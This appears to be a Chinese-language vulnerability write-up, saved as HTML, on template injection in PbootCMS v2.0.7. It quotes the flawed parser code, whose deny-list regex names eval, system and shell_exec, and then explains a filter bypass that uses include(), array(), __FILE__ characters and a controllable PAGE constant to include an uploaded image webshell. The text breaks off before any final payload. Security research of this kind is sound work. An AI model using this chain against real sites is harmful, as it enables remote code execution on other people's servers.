<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csFE4DF89B{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="pbootcms-v207-模板注入"><span class="csDE05BCC">PbootCMS v2.0.7 </span><span class="csECDA2D3">模板注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">PbootCMS v2.0.7</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs9FB05234">apps/home/controller/ParserController.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">精简后的代码如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function parserIfLabel($content){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pattern = &#39;/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (preg_match_all($pattern, $content, $matches)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$count = count($matches[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for ($i = 0; $i &lt; $count; $i ++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$danger = false;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">带有函数的条件语句进行安全校验</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (preg_match_all(&#39;/([\w]+)([\\\s]+)?\(/i&#39;, $matches[1][$i], $matches2)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($matches2[1] as $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (function_exists($value)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$danger = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">过滤特殊字符串</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (preg_match(&#39;/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i&#39;, $matches[1][$i])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$danger = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">如果有危险函数，则不解析该</span><span class="cs9FB05234">IF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($danger) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(&#39;if(&#39; . $matches[1][$i] . &#39;){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里大概的意思就是，在模板的</span><span class="cs9FB05234">if</span><span class="cs9C1B1871">语句中，通过正则找到函数的结构，然后将其传入</span><span class="cs9FB05234">function_exists</span><span class="cs9C1B1871">，如果该函数存在则不执行下面的</span><span class="cs9FB05234">eval()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果可以编辑模板文件，或者存在模板注入的话，那么就可以尝试绕一下这些限制，看能不能往</span><span class="cs9FB05234">eval()</span><span class="cs9C1B1871">里面注入代码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在后台翻了一下，没有看到有对模板文件进行修改的地方，所以考虑模板注入。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在后台的公司信息栏目插入符合模板</span><span class="cs9FB05234">if</span><span class="cs9C1B1871">语句的</span></p><h3 class="cs868C439D">
			<a name="payload"><span class="csD1E291E2">Payload:</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9FB05234">{pboot:if(1)}OK{/pboot:if}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="346" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="237" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到这里的模板语句已经解析了。所以这里是存在模板注入的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是这个程序是有对所有参数进行全局的</span><span class="cs9FB05234">htmlspecialchars</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">addslashes</span><span class="cs9C1B1871">的，在结合上面的正则，导致我们不能使用很多字符。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">有：</span><span class="cs9FB05234">&#39;&quot;$}</span><span class="cs9C1B1871">和反引号、</span><span class="cs9FB05234">\x00</span><span class="cs9C1B1871">等等。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据这个限制我很快有了一种思路：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">php</span><span class="cs9C1B1871">的语法有一些具有函数结构，但是却不是函数的关键字。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如：</span><span class="cs9FB05234">include()</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">array()</span><span class="cs9C1B1871">等。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">现在思路就很明确了，既然</span><span class="cs8926E06"> </span><span class="cs9FB05234">include()</span><span class="cs9C1B1871">可以绕过函数检测这个点，那么往里面传参数就完事了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接下来就是要想办法在当前限制下构造出一个字符串往</span><span class="cs9FB05234">include()</span><span class="cs9C1B1871">里面传了。</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">思路</span><span class="cs8926E06">1</span><span class="cs9C1B1871">：</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">通过</span><span class="cs9FB05234">$_SERVER</span><span class="cs9C1B1871">数组传，但是前面的正则</span><span class="cs8926E06">ban</span><span class="cs9C1B1871">了</span><span class="cs9FB05234">$</span><span class="cs9C1B1871">，所以这个思路不行。</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">思路</span><span class="cs8926E06">2</span><span class="cs9C1B1871">：</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">使用</span><span class="cs9FB05234">get_defined_vars()</span><span class="cs9C1B1871">从</span><span class="cs8926E06">get</span><span class="cs9C1B1871">的参数里面获取，但是</span><span class="cs9FB05234">get_defined_vars</span><span class="cs9C1B1871">不能过</span><span class="cs9FB05234">function_exists</span><span class="cs9C1B1871">，所以也不行。</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">思路</span><span class="cs8926E06">3</span><span class="cs9C1B1871">：</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">PHP7.2</span><span class="cs9C1B1871">版本开始：不带引号的字符串是不存在的全局常量的话，那么则转化成他们自身的字符串。</span></li><li class="cs24C36B3"><span class="cs9C1B1871">意思就是</span><span class="cs9FB05234">echo a</span><span class="cs8926E06">=&gt;</span><span class="cs9FB05234">define(a, &#39;a&#39;);echo a;</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image2.png" width="361" height="223" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么就可以不使用引号，从而构造字符串了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以我们可以在后台上传一个图片马，然后用</span><span class="cs9FB05234">include()</span><span class="cs9C1B1871">去包含</span><span class="cs8926E06">getshell</span><span class="cs9C1B1871">了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但是这里有个问题，上传后的图片路径会有数字和</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">.</span><span class="cs9C1B1871">，而数字和</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">.</span><span class="cs9C1B1871">不带引号是不会触发上面说的</span><span class="cs8926E06">trick</span><span class="cs9C1B1871">的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">也就是现在能构造任意字母了，但是还需要数字和</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">.</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">/</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">.</span><span class="cs9C1B1871">其实很好办，</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">有几个预定义常量如</span><span class="cs9FB05234">__FILE__</span><span class="cs9C1B1871">，获取当前的文件的绝对路径</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在程序里打印一下看看</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="208" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">.</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">/</span><span class="cs9C1B1871">都有，但是直接用数组的方式去取是会报错的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这时候就需要用到刚刚说的</span><span class="cs9FB05234">array()</span><span class="cs9C1B1871">了，将</span><span class="cs9FB05234">__FILE__</span><span class="cs9C1B1871">放进</span><span class="cs9FB05234">array()</span><span class="cs9C1B1871">里之后再利用去二维数组的方式去取就不会报错了。</span><span class="csE3F655E4">（因为这里是将常量赋值进了数组里面，不是直接对常量进行数组的方式取值，所以不会报错。）</span></p><p class="cs3A447A38"><span class="cs9FB05234">var_dump(array(__FILE__)[0][-4]); //=.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">var_dump(array(__FILE__)[0][-21]); //=/</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="253" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">现在就缺数字了，而且该数字还必须是</span><span class="cs8926E06">String</span><span class="cs9C1B1871">型的数字。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PHP</span><span class="cs9C1B1871">下还有带有数字的常量，例如</span><span class="cs9FB05234">__LINE__</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">__PHP_VERSION__</span><span class="cs9C1B1871">，但是这些数字可能不太够，而且也不太能确定具体得值，不够</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">一般化</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是开始寻找别的办法。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是我开始全局搜索</span><span class="cs9FB05234">define(</span><span class="cs9C1B1871">，寻找在程序中定义的，可控或者含有数字的常量。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs9FB05234">core/view/Paging.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public function limit($total = null, $morePageStr = false){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">起始数据调整</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! is_numeric($this-&gt;start) || $this-&gt;start &lt; 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;start = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;start &gt; $total) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;start = $total + 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置总数</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($total) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;rowTotal = $total - ($this-&gt;start - 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置分页大小</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! isset($this-&gt;pageSize)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;pageSize = get(&#39;pagesize&#39;) ?: Config::get(&#39;pagesize&#39;) ?: 15;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">分页数字条数量</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;num = Config::get(&#39;pagenum&#39;) ?: 5;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">计算页数</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;pageCount = @ceil($this-&gt;rowTotal / $this-&gt;pageSize);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">获取当前页面</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;page = $this-&gt;page();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">定义相关常量，用于方便模板引擎解析序号等计算和调用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;define(&#39;ROWTOTAL&#39;, $this-&gt;rowTotal);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;define(&#39;PAGECOUNT&#39;, $this-&gt;pageCount);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;define(&#39;PAGE&#39;, $this-&gt;page);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;define(&#39;PAGESIZE&#39;, $this-&gt;pageSize);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">注入分页模板变量</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;assign($morePageStr);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">返回限制语句</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return ($this-&gt;page - 1) * $this-&gt;pageSize + ($this-&gt;start - 1) . &quot;,$this-&gt;pageSize&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// </span><span class="cs7FFD2630">当前页码容错处理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;private function page(){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$page = get(&#39;page&#39;, &#39;int&#39;) ?: $this-&gt;page;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_numeric($page) &amp;&amp; $page &gt; 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($page &gt; $this-&gt;pageCount &amp;&amp; $this-&gt;pageCount) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $this-&gt;pageCount;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $page;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里是该程序的一个分页类，可以看到里面有一个叫</span><span class="cs9FB05234">PAGE</span><span class="cs9C1B1871">的常量，且该常量可控。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么就寻找调用了这个分页类的地方传入</span><span class="cs9FB05234">page</span><span class="cs9C1B1871">就好。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如：</span><span class="cs9FB05234">http://www.0-sec.org/?keyword=123&amp;page=0123456789</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20v2.0.7%20%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5_files/image5.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">且该常量为</span><span class="cs8926E06">string</span><span class="cs9C1B1871">类型。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">至此，路径中需要的字符都构造出来了，只需要用</span><span class="cs9FB05234">.</span><span class="cs9C1B1871">连接即可。</span></p><h3 